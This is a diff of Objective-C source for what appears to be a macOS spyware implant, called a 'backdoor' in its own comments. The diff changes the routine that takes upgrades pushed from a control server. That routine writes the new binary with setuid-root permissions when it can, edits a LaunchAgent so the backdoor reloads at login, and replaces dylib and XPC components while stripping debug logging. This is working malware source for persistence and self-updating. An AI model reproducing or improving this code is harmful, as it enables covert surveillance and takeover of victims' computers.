@@ -34,11 +34,14 @@
 - (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath
 {
   BOOL success = NO;
+  u_long permissions;
   
-  //
-  // Forcing suid permission on the backdoor upgrade
-  //
-  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+  // FIXED-
+  if (getuid() == 0 || geteuid() == 0)
+    permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+  else
+    permissions  = (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+    
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner      = [NSNumber numberWithInt: 0];
   
@@ -54,17 +57,10 @@
                                                     error: nil];
   
   if (success == NO)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"Error while changing attributes on the upgrade file");
-#endif
-      return success;
-    }
-  
-  //
+      return success;  
+      
   // Once the backdoor has been written, edit the backdoor Loader in order to
   // load the new updated backdoor upon reboot/login
-  //
   NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                    NSHomeDirectory(),
                                    BACKDOOR_DAEMON_PLIST];
@@ -194,11 +190,7 @@
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+    {    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -214,11 +206,7 @@
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+    {     
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -227,11 +215,7 @@
     }
   
   if (command != PROTO_OK)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"No upload request available (command %d)", command);
-#endif
-      
+    {     
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -257,9 +241,6 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on parameters makerange (%@)", [e reason]);
-#endif
       
       [replyDecrypted release];
       [commandData release];
@@ -286,11 +267,7 @@
                      [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on stringData makerange (%@)", [e reason]);
-#endif
-      
+    {    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -299,7 +276,9 @@
     }
   
   NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
-  
+
+#define XPC_UPGRADE @"xpc" 
+
   if (filename == nil)
     {
 #ifdef DEBUG_UPGRADE_NOP
@@ -308,23 +287,12 @@
     }
   else
     {
-#ifdef DEBUG_UPGRADE_NOP
-      infoLog(@"filename: %@", filename);
-      infoLog(@"file content: %@", fileContent);
-#endif
-    
       if ([filename isEqualToString: CORE_UPGRADE])
         {
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a core upgrade");
-#endif
           NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     gBackdoorUpdateName];
-          
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Writing core upgrade @ %@", _upgradePath);
-#endif
+
           [fileContent writeToFile: _upgradePath
                         atomically: YES];
           
@@ -339,83 +307,36 @@
         }
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a dylib upgrade");
-#endif
-          
-          NSString *_upgradePath;
-          NSString *_tempLocalPath = [[NSString alloc] initWithFormat:
-                                      @"%@/%@",
-                                      [[NSBundle mainBundle] bundlePath],
-                                      gInputManagerName];
-
-          if ([gUtil isLeopard])
-            {
-              _upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                           @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
-                           EXT_BUNDLE_FOLDER,
-                           EXT_BUNDLE_FOLDER,
-                           gInputManagerName];
-
-              //
-              // Force owner since we can't remove that file if not owned by us
-              // with removeItemAtPath:error (Required only on Leopard)
-              //
-              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
-              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
-                                         userAndGroup,
-                                         _upgradePath,
-                                         nil];
-
-              [gUtil executeTask: @"/usr/sbin/chown"
-                   withArguments: _tempArguments
-                    waitUntilEnd: YES];
-            }
-          else
-            {
-              _upgradePath = [[NSString alloc] initWithFormat:
-                @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@", 
-                EXT_BUNDLE_FOLDER,
-                gInputManagerName];
-            }
-          
-          // Now remove it
+          // FIXED-
+          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                    [[NSBundle mainBundle] bundlePath],
+                                    RCS8_UPDATE_DYLIB];
+           
           [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                      error: nil];
-
+          // And write it back
+          [fileContent writeToFile: _upgradePath
+                        atomically: YES];
+                        
+          [_upgradePath release];
+        }
+      else if ([filename isEqualToString: XPC_UPGRADE])
+        {
+          // FIXED-
+          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                    [[NSBundle mainBundle] bundlePath],
+                                    RCS8_UPDATE_XPC];
+          
+          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
+                                                     error: nil];
           // And write it back
           [fileContent writeToFile: _upgradePath
                         atomically: YES];
           
-          //
-          // Write it inside the local folder so that next time the backdoor starts
-          // it won't overwrite it within the old one
-          //
-          [[NSFileManager defaultManager] removeItemAtPath: _tempLocalPath
-                                                     error: nil];
-          [fileContent writeToFile: _tempLocalPath
-                        atomically: YES];
-
-          [_tempLocalPath release];
-
-          NSArray *arguments = [NSArray arrayWithObjects:
-                                @"-R",
-                                @"root:admin",
-                                _upgradePath,
-                                nil];
-
-          [gUtil executeTask: @"/usr/sbin/chown"
-               withArguments: arguments
-                waitUntilEnd: YES];
-          
           [_upgradePath release];
         }
       else if ([filename isEqualToString: KEXT_UPGRADE])
-        {
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a kext upgrade, not yet implemented");
-#endif
-          
+        {          
           // TODO: Update kext binary inside Resources subfolder
         }
       else
